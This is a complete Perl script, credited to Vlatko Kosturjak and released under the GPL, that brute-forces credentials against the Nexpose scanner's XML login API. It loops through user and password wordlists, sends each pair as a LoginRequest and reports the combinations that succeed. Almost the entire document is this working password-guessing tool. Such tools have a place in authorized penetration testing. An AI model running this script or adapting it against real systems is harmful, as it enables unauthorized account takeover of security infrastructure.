#!/usr/bin/perl
# Nexpose password cracker
# Copyright (C) Vlatko Kosturjak, Kost. Distributed under GPL.

use strict;

use Getopt::Long;
use LWP::UserAgent;
use HTTP::Request::Common;

my $nexpose_url = "https://localhost:3780/api/1.1/xml";
my $verbose = 0;
my $debug = 0;
my $maxreq = 16;
my $userfile;
my $passfile;

my $result = GetOptions (
	"u|url=s" => \$nexpose_url,
	"U|users=s" => \$userfile,
	"P|passwords=s" => \$passfile,
	"m|maxreq=i" => \$maxreq,
	"v|verbose"  => \$verbose,
	"d|debug" => \$debug,
	"h|help" => \&help
);

unless ($userfile and $passfile) {
	help();
}

open(USER,"<$userfile") or die ("cannot open user file $userfile: $!");
open(PASS,"<$passfile") or die ("cannot open password file $passfile: $!");

while(<USER>) {
	chomp;
	my $user = $_;
	while (<PASS>) {
		chomp;
		my $password = $_;
		guess ($user, $password);
	}
	seek (PASS,0,0);
}

sub guess {
	my ($user, $password) = @_;

	my $post_data = '<?xml version="1.0" encoding="UTF-8"?><LoginRequest sync-id="1" user-id="'.$user.'" password="'.$password.'"></LoginRequest>';

	my $ua = LWP::UserAgent->new;
	my $request = POST $nexpose_url, 'Content-Type'=>'text/xml', Content=>$post_data;

	print STDERR "Trying $user:$password: " if ($verbose);

	if ($debug) {
		$ua->add_handler("request_send",  sub { shift->dump; return });
		$ua->add_handler("response_done", sub { shift->dump; return });
	}

	my $result = $ua->request($request);
	if ($result->is_success) {
		if ($result->content =~ /LoginResponse.*success="0"/) {
			print STDERR "Wrong" if ($verbose);
		} elsif ($result->content =~ /LoginResponse.*success="1"/) {
			print STDERR "Success" if ($verbose);
			print "[o] Success! User: $user and Password: $password\n";
		} else {
			print STDERR "Unknown" if ($verbose);
		}
		print STDERR "\n" if ($verbose); 
	} else {
		print STDERR "Cannot login\n" if ($verbose);
	}
}

sub help 
{
	print "$0: Nexpose password cracker. \n";
	print "Copyright (C) Vlatko Kosturjak, Kost. Distributed under GPL.\n\n";
	print "Usage: $0 -u https://localhost:3780/api/1.1/xml -U userlist.txt -P passlist.txt\n\n";
	print "	-u <U>	use <U> for URL for Nexpose API (default: $nexpose_url)\n";
	print "	-U <U>	Use user list <U>\n";
	print "	-P <P>	Use password list <P>\n";
	print "	-m <m>	Maximum number of parallel request (default: $maxreq)\n";
	print "	-v	verbose\n";
	print "	-d	debug (be very verbose)\n";
	print "	-h 	this help message\n";
	exit (0);
} 
